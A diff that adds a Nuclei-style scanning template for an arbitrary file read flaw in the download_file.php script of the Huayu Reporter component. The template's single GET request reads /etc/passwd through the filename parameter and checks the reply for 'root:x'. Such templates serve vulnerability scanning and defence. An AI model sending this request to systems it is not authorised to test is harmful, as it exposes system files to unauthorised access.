@@ -1,0 +1,21 @@
+id: huayu-Reporter-fileRead
+info:
+  author: Str1am
+  name: "\u534E\u57DFReporter\u7EC4\u4EF6download_file.php\u6587\u4EF6filename\u53C2\
+    \u6570\u524D\u53F0\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6"
+  severity: high
+  tags: Reporter,fileRead
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - root:x
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/view/action/download_file.php?filename=/etc/passwd&savename=query.xls'
